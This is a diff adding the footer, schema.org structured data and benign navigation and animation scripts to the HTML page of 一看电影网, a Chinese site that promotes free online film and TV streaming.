+<section><div class="wrap"><div class="cta">
+  <div class="pr">$ yikan --play --now</div>
+  <h2>今天，<em>一看</em>就是好电影</h2>
+  <p>一看电影网（yikandianyingwang-wap）高清电影电视剧免费在线观看，片源丰富、更新及时，打开即看，免注册、多端自适应。</p>
+  <div class="btns"><a class="c1" href="#hot">立即观看 →</a><a class="c2" href="#ch">浏览频道列表</a></div>
+</div></div></section>
+
+<!-- ============ 页脚 ============ -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="f-grid">
+      <div>
+        <div class="logo"><span class="mk">▶</span><b>一看电影网<i>_</i></b><em>YIKAN · WAP</em></div>
+        <p class="f-desc">一看电影网（yikandianyingwang-wap）专注高清电影与电视剧免费在线观看，覆盖院线大片、经典老片、美剧韩剧与综艺动漫，打开即看、每日更新。</p>
+        <div class="social"><a href="#" aria-label="微信">微</a><a href="#" aria-label="微博">博</a><a href="#" aria-label="抖音">音</a><a href="#" aria-label="RSS">R</a></div>
+      </div>
+      <div class="f-col"><h4>// 快速入口</h4><ul>
+        <li><a href="#hot">热门片单</a></li><li><a href="#ch">频道分类</a></li>
+        <li><a href="#rank">热播榜单</a></li><li><a href="#cal">放映日历</a></li>
+      </ul></div>
+      <div class="f-col"><h4>// 热门频道</h4><ul>
+        <li><a href="#">院线大片</a></li><li><a href="#">经典老片</a></li>
+        <li><a href="#">电视剧集</a></li><li><a href="#">美剧韩剧</a></li>
+      </ul></div>
+      <div class="f-col"><h4>// 关于本站</h4><ul>
+        <li><a href="#">网站简介</a></li><li><a href="#">播放指南</a></li>
+        <li><a href="#">联系我们</a></li><li><a href="#">免责声明</a></li>
+      </ul></div>
+    </div>
+    <div class="f-bot"><span>© 2026 一看电影网 · ALL RIGHTS RESERVED</span><span>https://yikandianyingwang-wap.github.io/</span></div>
+  </div>
+</footer>
+
+<a href="#home" class="up" id="up" aria-label="回到顶部">↑</a>
+
+<!-- ============ 结构化数据 ============ -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "一看电影网",
+  "alternateName": "yikandianyingwang-wap",
+  "url": "https://yikandianyingwang-wap.github.io/",
+  "description": "一看电影网提供高清电影与电视剧免费在线观看，片源丰富、更新及时，覆盖院线大片、经典老片、美剧韩剧与综艺动漫，打开即看。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://yikandianyingwang-wap.github.io/#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "一看电影网",
+  "url": "https://yikandianyingwang-wap.github.io/",
+  "logo": "https://yikandianyingwang-wap.github.io/favicon.ico"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {"@type": "ListItem", "position": 1, "name": "首页", "item": "https://yikandianyingwang-wap.github.io/"},
+    {"@type": "ListItem", "position": 2, "name": "热门片单", "item": "https://yikandianyingwang-wap.github.io/#hot"},
+    {"@type": "ListItem", "position": 3, "name": "热播榜单", "item": "https://yikandianyingwang-wap.github.io/#rank"}
+  ]
+}
+</script>
+
+<script>
+(function(){
+  var b=document.getElementById('tbtn'),m=document.getElementById('menu');
+  b.addEventListener('click',function(){
+    var o=m.classList.toggle('open');
+    b.setAttribute('aria-expanded',o?'true':'false');
+  });
+  m.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){m.classList.remove('open');b.setAttribute('aria-expanded','false');});
+  });
+})();
+(function(){
+  var links=document.querySelectorAll('.menu a'),secs=document.querySelectorAll('section[id]');
+  window.addEventListener('scroll',function(){
+    var pos=window.scrollY+150,cur='';
+    secs.forEach(function(s){if(s.offsetTop<=pos)cur=s.id;});
+    links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+    document.getElementById('up').classList.toggle('show',window.scrollY>500);
+  });
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(e){if(e.isIntersecting){e.target.style.setProperty('--w',e.target.dataset.w+'%');}});
+    },{threshold:.2});
+    document.querySelectorAll('.rk').forEach(function(r,i){
+      r.dataset.w=(94-i*8);
+      var bar=document.createElement('span');bar.className='bar';
+      r.appendChild(bar);
+      io.observe(r);
+    });
+    var tick=0;
+    setInterval(function(){document.querySelectorAll('.rk').forEach(function(r){r.querySelector('.bar').style.width=(r.dataset.w-tick)+'%';});tick=(tick+2)%6;},40);
+  }
+})();
+document.getElementById('up').addEventListener('click',function(e){e.preventDefault();window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
